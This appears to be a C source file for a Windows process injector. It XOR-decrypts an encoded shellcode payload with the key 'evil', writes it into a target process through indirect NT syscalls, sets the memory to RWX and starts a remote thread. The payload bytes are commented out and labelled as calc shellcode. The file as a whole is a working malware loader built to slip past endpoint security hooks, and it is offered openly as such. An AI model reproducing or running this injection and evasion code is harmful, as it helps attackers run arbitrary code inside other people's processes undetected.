#include "Injector.h"

// x64 calc shellcode
// unsigned char payload [] = 
// "\x99\x3e\xea\x88\x95\x9e\xa9\x6c\x65\x76\x28\x3d\x24\x26"
// "\x3b\x3d\x33\x3e\x58\xbe\x00\x3e\xe2\x3e\x05\x3e\xe2\x3e"
// "\x7d\x3e\xe2\x3e\x45\x3e\xe2\x1e\x35\x3e\x66\xdb\x2f\x3c"
// "\x24\x5d\xac\x3e\x58\xac\xc9\x4a\x08\x10\x67\x5a\x49\x2d"
// "\xa4\xbf\x64\x2d\x64\xb7\x8b\x81\x37\x37\x38\x24\xee\x24"
// "\x49\xe7\x27\x4a\x21\x6d\xb5\xfd\xe9\xe4\x65\x76\x69\x24"
// "\xe0\xb6\x1d\x0b\x2d\x77\xb9\x3c\xee\x3e\x71\x28\xee\x36"
// "\x49\x25\x64\xa6\x8a\x3a\x2d\x89\xa0\x2d\xee\x42\xe1\x24"
// "\x64\xa0\x24\x5d\xac\x3e\x58\xac\xc9\x37\xa8\xa5\x68\x37"
// "\x68\xad\x5d\x96\x1c\x9d\x29\x75\x25\x48\x6d\x33\x50\xbd"
// "\x10\xae\x31\x28\xee\x36\x4d\x25\x64\xa6\x0f\x2d\xee\x7a"
// "\x21\x28\xee\x36\x75\x25\x64\xa6\x28\xe7\x61\xfe\x21\x6d"
// "\xb5\x37\x31\x2d\x3d\x28\x30\x36\x24\x2e\x28\x35\x24\x2c"
// "\x21\xef\x89\x56\x28\x3e\x9a\x96\x31\x2d\x3c\x2c\x21\xe7"
// "\x77\x9f\x3e\x93\x9a\x89\x34\x24\xdf\x77\x69\x6c\x65\x76"
// "\x69\x6c\x65\x3e\xe4\xe1\x64\x77\x69\x6c\x24\xcc\x58\xe7"
// "\x0a\xf1\x96\xb9\xde\x86\xdc\xce\x33\x37\xd3\xca\xf0\xcb"
// "\xf4\x93\xb0\x3e\xea\xa8\x4d\x4a\x6f\x10\x6f\xf6\x92\x8c"
// "\x10\x73\xd2\x2b\x76\x04\x06\x06\x65\x2f\x28\xe5\xbf\x89"
// "\xbc\x0f\x04\x1a\x0a\x42\x00\x0e\x0c\x6c";

VOID    XOR_decrypte(PBYTE data, DWORD data_len, PBYTE key, DWORD key_len)
{
	for (DWORD i = 0; i < data_len; i++)
	{
		data[i] = data[i] ^ key[i % key_len];
	}
}


VOID Injector(PAPI pAPI, PPARAMS pParams)
{
    OBJECT_ATTRIBUTES   objAttr             = { 0 };
	CLIENT_ID			cID		            = { 0 };
    HANDLE              hTargetProcess      = NULL;
    HANDLE              hTargetThread       = NULL;
    LPVOID              remoteBuffer        = NULL;
    DWORD64             remoteBufferSize    = 0x1000;
    NTSTATUS            status              = 0;
    ULONG               oldProtection       = 0;

    printf("[*] Start Injecting Process (PID = %d).\n", pParams->Pid);

    cID.UniqueProcess	= pParams->Pid;
	cID.UniqueThread	= 0;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    InitilizeSysFunc(pAPI->Ntdll.NtOpenProcess);
    if ( (status = IndirectSyscall(&hTargetProcess, PROCESS_ALL_ACCESS, &objAttr, &cID)) != 0 )
    {
        printf("[!] NtOpenProcess Failed With Status : 0x%0.8X.\n", status);
		return ;
    }
    
    printf("[+] Open Handle To Target Process: 0x%0.4X.\n", hTargetProcess);
    
    InitilizeSysFunc(pAPI->Ntdll.NtAllocateVirtualMemory);
    if ( (status = IndirectSyscall(hTargetProcess, &remoteBuffer, 0, &remoteBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0 )
    {
        printf("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X.\n", status);
        return ;
    }

    printf("[+] Remote Buffer Created: 0x%0.8X.\n", remoteBuffer);

    XOR_decrypte(payload, sizeof(payload), "evil", 4);

    InitilizeSysFunc(pAPI->Ntdll.NtWriteVirtualMemory);
    if ( (status = IndirectSyscall(hTargetProcess, remoteBuffer, payload, sizeof(payload), NULL)) != 0 )
    {
        printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X.\n", status);
        return ;
    }

    InitilizeSysFunc(pAPI->Ntdll.NtProtectVirtualMemory);
    if ( (status = IndirectSyscall(hTargetProcess, &remoteBuffer, &remoteBufferSize, PAGE_EXECUTE_READWRITE, &oldProtection)) != 0 )
    {
        printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X.\n", status);
        return ;
    }

    printf("[+] Change Remote Buffer Protection to RWX.\n");

    InitilizeSysFunc(pAPI->Ntdll.NtCreateThreadEx);
    if ( (status = IndirectSyscall(&hTargetThread, 0x1FFFFF, NULL, hTargetProcess, remoteBuffer, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0 )
    {
        printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X.\n", status);
        return ;
    }
    
    printf("[+] Remote Thread Created: 0x%0.8X.\n", hTargetThread);

    printf("[+] Done.\n");
}